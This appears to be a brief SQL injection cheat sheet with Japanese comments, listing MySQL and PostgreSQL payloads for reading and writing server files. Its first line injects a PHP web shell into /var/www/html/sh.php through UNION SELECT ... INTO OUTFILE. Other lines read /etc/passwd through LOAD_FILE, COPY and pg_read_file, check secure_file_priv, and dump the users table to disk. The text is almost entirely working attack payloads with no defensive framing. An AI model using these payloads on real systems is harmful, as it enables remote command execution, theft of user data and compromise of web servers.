' UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/sh.php' -- 
-- 読取り:
' UNION SELECT LOAD_FILE('/etc/passwd') -- 
-- 制限確認: SELECT @@GLOBAL.secure_file_priv;

//PostgreSQL
create table tmp(data text);
copy tmp from '/etc/passwd';
select * from tmp; //新しいテーブルを作成して内容を返す

SELECT 
pg_read_file('/etc/passwd') //ファイルを読み込み(単一フィールドで)

//MySQL 
SELECT @@GLOBAL.secure_file_priv;　// 読み書き制限のシステム変数を確認(これで返答のあった場所が可能箇所)
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'　// ファイル書き込み
SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')// 作成したファイル読み込み

